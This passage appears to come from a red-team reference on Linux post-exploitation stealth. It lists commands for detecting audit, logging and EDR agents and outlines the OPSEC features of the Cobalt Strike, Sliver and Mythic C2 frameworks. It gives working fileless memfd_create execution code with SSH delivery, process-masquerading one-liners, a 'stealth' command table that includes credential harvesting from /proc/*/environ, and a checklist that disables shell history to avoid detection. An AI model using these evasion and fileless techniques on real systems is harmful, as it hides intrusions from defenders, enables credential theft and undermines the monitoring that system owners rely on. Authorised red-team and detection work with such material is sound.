cat /etc/rsyslog.d/*.conf 2>/dev/null | grep -v '^#'
cat /etc/syslog-ng/syslog-ng.conf 2>/dev/null | head -50

# Is log forwarding enabled? (remote syslog = you cannot delete logs)
grep -r '@' /etc/rsyslog.conf /etc/rsyslog.d/ 2>/dev/null | grep -v '^#'

# Check if PROMPT_COMMAND logs to syslog
grep PROMPT_COMMAND /etc/bash.bashrc /etc/profile /etc/profile.d/* 2>/dev/null

# Check auditd status
auditctl -s 2>/dev/null
auditctl -l 2>/dev/null

# Check for EDR/security agents
ls /opt/CrowdStrike/ /opt/carbonblack/ /opt/qualys/ /opt/rapid7/ 2>/dev/null
ls /var/ossec/ 2>/dev/null
pgrep -la 'falcon\|cb\|qualys\|nessus\|ossec\|wazuh\|auditd\|sysmon\|osquery'

# Check journald config
cat /etc/systemd/journald.conf 2>/dev/null | grep -v '^#'
```

---

## 3. Red Team Framework OPSEC Patterns

### 3.1 Cobalt Strike Linux Beacon

**Architecture:**
- Native Linux ELF beacon (Cross C2) or reimplementations (Vermilion Strike, geacon)
- Vermilion Strike: custom Linux ELF with CS C2 protocol, uses DNS TXT queries for C2
- geacon: Go-based open-source implementation

**OPSEC features:**
- **Malleable C2 profiles**: Configure traffic to match legitimate application patterns (user-agent, URI paths, headers, timing)
- **spawnto module**: Defines which binary child processes use when spawning post-exploitation jobs
- **ppid module**: Spoofs parent process ID to create legitimate-looking process trees
- **Sleep + jitter**: Configurable beacon interval with percentage-based jitter
- **SMB/TCP beacons**: Internal pivoting without touching the network edge
- **In-memory execution**: BOF (Beacon Object Files) run in beacon's process memory, no fork+exec

**Tradecraft principles from CS:**
1. Avoid fork-and-run where possible (creates child processes that are detectable)
2. Use inline execution (BOFs) for enumeration tasks
3. Configure sleep times appropriate to the target environment
4. Use HTTPS with domain fronting or legitimate-looking C2 domains
5. Rotate implants -- do not rely on a single callback

### 3.2 Sliver C2

**Architecture:**
- Go-based implants for Linux, macOS, Windows
- Dynamic compilation with per-binary asymmetric encryption keys

**OPSEC features:**
- **Protocol diversity**: mTLS, WireGuard, HTTP(S), DNS
- **Traffic encryption**: Per-implant unique keys; session key negotiation
- **In-memory execution**: BOF and COFF loader support
- **Pivoting**: Built-in SOCKS5 proxy in agent
- **Dynamic compilation**: Each implant is unique (defeats hash-based detection)

**Linux-specific capabilities:**
- Process injection and migration
- File browser without shell commands
- Built-in credential harvesting
- Socks5 proxy for pivoting

### 3.3 Mythic C2 (Poseidon Agent -- Linux/macOS)

**Architecture:**
- Poseidon: Go-based agent using CGO for OS-specific API calls
- Medusa: Python-based agent for Linux/macOS/Windows

**OPSEC features:**
- **Dynamic OPSEC checks**: Some agents validate OPSEC safety before executing tasks
- **Staged loading**: Initial payload is minimal; additional functions loaded post-execution
- **Code obfuscation**: Base64 + XOR encoding of agent code
- **Websocket C2**: Blends with modern web traffic
- **TCP-based internal C2**: For pivot agents in segmented networks

**Poseidon capabilities:**
- Websockets protocol for C2
- SOCKS5 in-agent proxy
- In-memory JavaScript execution (macOS automation)
- XPC IPC messaging
- HMAC+AES with EKE encrypted communications

### 3.4 PTES/OSSTMM Operational Security Guidelines

**PTES Post-Exploitation Phase:**
1. Maintain the rules of engagement at all times
2. Determine criticality of the compromised system before acting
3. Maintain access for future use (persistence) while minimizing footprint
4. Document all actions for the report
5. Protect the client -- do not expose their systems to additional risk

**Operational Security Principles:**
1. Minimize tooling on target -- use native binaries where possible (LOTL philosophy)
2. Encrypt all C2 communications
3. Maintain detailed operator logs (what you did, when, from where)
4. Use dedicated infrastructure per engagement
5. Sanitize tools of identifying information
6. Time operations to match target's normal activity patterns

---

## 4. Fileless Execution Reference

### 4.1 memfd_create In-Memory Execution

```bash
# Concept: Create anonymous file in memory, write ELF binary, execute via /proc/self/fd/
# No file touches disk. Requires Linux kernel 3.17+

# Perl one-liner framework (for delivery via SSH pipe):
# 1. Create memfd
# 2. Write ELF binary as hex
# 3. Execute via /proc/$$/fd/$fd

# Delivery:
cat elfloader.pl | ssh user@target 'exec -a "[kworker/0:1]" perl'

# Python equivalent:
python3 -c "
import ctypes, os, sys
libc = ctypes.CDLL('libc.so.6')
# memfd_create syscall
fd = libc.syscall(319, b'', 1)  # 319 = __NR_memfd_create on x86_64, 1 = MFD_CLOEXEC
# Write ELF binary to fd
with open('/proc/self/fd/%d' % fd, 'wb') as f:
    f.write(elf_bytes)
# Execute
os.execve('/proc/self/fd/%d' % fd, ['legitimate_name', 'args'], os.environ)
"

# Detection indicators:
# - /proc/PID/exe -> /memfd:name (deleted)
# - execve() with /proc/self/fd/N path
# - memfd_create() syscall in audit logs
```

### 4.2 Process Masquerading

```bash
# Rename process to look like kernel thread
exec -a "[kworker/0:1-events]" bash

# Rename process to look like legitimate service
exec -a "sshd: user@pts/0" bash
exec -a "/usr/sbin/apache2 -k start" python3 script.py

# Use prctl(PR_SET_NAME) to change /proc/self/comm
# (This is what /proc/PID/comm shows, which ps and top read)
```

---

## 5. Quick Reference: Noisy vs. Stealth

| Noisy Command | Stealth Alternative | Why Stealthier |
|---------------|---------------------|----------------|
| `whoami` | `cat /proc/self/status \| grep Uid` | No execve syscall for whoami binary |
| `id` | `awk ... /proc/self/status` | No execve, pure /proc read |
| `cat /etc/passwd` | `awk -F: '{...}' /etc/passwd` | Still reads file but no cat execve |
| `sudo -l` | `grep sudo /etc/group` + check sudoers | Avoids sudo logging entirely |
| `find / -perm -4000` | Targeted checks on 8-10 dirs | 99% fewer stat() syscalls |
| `getcap -r /` | `getcap` on specific binaries only | Targeted, not recursive |
| `ps aux` | `/proc/[pid]/status` reads | No ps binary execution |
| `ss -tlnp` | `cat /proc/net/tcp` + awk parser | No ss/netstat binary |
| `cat /etc/shadow` | `/proc/*/environ` credential harvest | Avoids most-watched file |
| `uname -a` | `cat /proc/version` | No uname binary |
| `hostname` | `echo $HOSTNAME` or `cat /proc/sys/kernel/hostname` | Shell built-in or /proc |
| `find / -writable` | Targeted dir checks | Massively reduced I/O |
| `crontab -l` | `cat /var/spool/cron/crontabs/$USER` | No crontab binary |
| `ssh-keygen` | `openssl genpkey` in /dev/shm | Different audit profile, RAM storage |
| `netstat -rn` | `cat /proc/net/route` | No netstat binary |
| `ifconfig` | `cat /proc/net/dev` | No ifconfig binary |
| `lsmod` | `cat /proc/modules` | No lsmod binary |
| `mount` | `cat /proc/mounts` | No mount binary |

---

## 6. Pre-Operation Checklist

Before running ANY enumeration on a target:

```bash
# 1. Assess defensive posture FIRST
pgrep -la 'auditd\|ossec\|wazuh\|falcon\|sysmon\|osquery\|aide\|tripwire\|rkhunter'

# 2. Check audit configuration
auditctl -l 2>/dev/null
auditctl -s 2>/dev/null

# 3. Check shell history config
echo $HISTCONTROL
echo $PROMPT_COMMAND
lsattr ~/.bash_history 2>/dev/null

# 4. Check log forwarding (if remote, you cannot delete logs)
grep -r '@' /etc/rsyslog.conf /etc/rsyslog.d/ 2>/dev/null

# 5. Disable history for this session
set +o history; unset HISTFILE; export HISTSIZE=0

# 6. Note the FIM scan schedule
cat /etc/cron.d/aide 2>/dev/null
crontab -l 2>/dev/null | grep -i aide
cat /var/ossec/etc/ossec.conf 2>/dev/null | grep -A5 frequency

# 7. Plan your enumeration with jitter
# Spread commands over 5-10 minutes, not 5-10 seconds
```

---

Sources:
- [GTFOBins](https://gtfobins.github.io/) -- Unix binary exploitation reference
- [InternalAllTheThings - Linux Evasion](https://swisskyrepo.github.io/InternalAllTheThings/redteam/evasion/linux-evasion/)
- [Staaldraad - Netstat Without Netstat](https://staaldraad.github.io/2017/12/20/netstat-without-netstat/)
- [Linux /proc Enumeration](https://idafchev.github.io/enumeration/2018/03/05/linux_proc_enum.html)
- [Blindsiding auditd (CODE WHITE)](https://code-white.com/blog/2023-08-blindsiding-auditd-for-fun-and-profit/)
- [Disable Shell History OPSEC](https://unclesp1d3r.github.io/posts/2023-02-08-disable-command-history/)
- [Linux Evasion Techniques (LessSecure)](https://lesssecure.com/tutorials/linux-evasion)
- [In-Memory ELF Execution](https://magisterquis.github.io/2018/03/31/in-memory-only-elf-execution.html)
- [MITRE ATT&CK T1562.012](https://attack.mitre.org/techniques/T1562/012/)
- [Atomic Red Team T1562.012](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1562.012/T1562.012.md)
- [Elastic Security Labs - Linux Detection with Auditd](https://www.elastic.co/security-labs/linux-detection-engineering-with-auditd)
- [Linux auditd for Threat Detection](https://izyknows.medium.com/linux-auditd-for-threat-detection-d06c8b941505)
- [Cobalt Strike Comprehensive Guide](https://0xteamsec.blogspot.com/2025/01/cobaltstrike-comprehensive-guide.html)
- [Sliver C2 Framework](https://github.com/BishopFox/sliver)
- [Mythic Poseidon Agent](https://docs.specterops.io/mythic-agents/poseidon-docs/home)
- [ShadowHS Fileless Framework](https://news.backbox.org/2026/01/30/shadowhs-a-fileless-linux-post%E2%80%91exploitation-framework-built-on-a-weaponized-hackshell/)
- [MITRE ATT&CK T1003.008](https://attack.mitre.org/techniques/T1003/008/)
- [Red Canary - Detection Engineer Guide to Linux](https://redcanary.com/blog/linux-security/detection-engineer-guide-to-linux/)
- [HackTricks - Linux Privilege Escalation](https://book.hacktricks.xyz/linux-hardening/privilege-escalation)
- [HackTricks - Linux Capabilities](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities)
- [Modular C2 Frameworks 2025-2026](https://blog.alphahunt.io/modular-c2-frameworks-quietly-redefine-threat-operations-for-2025-2026/)
- [Fileless Injection with memfd_create](https://medium.com/@lordshen/fileless-injection-with-memfd-create-8410d429c0e0)
- [Sandfly - Detecting memfd_create Fileless Malware](https://sandflysecurity.com/blog/detecting-linux-memfd-create-fileless-malware-with-command-line-forensics)
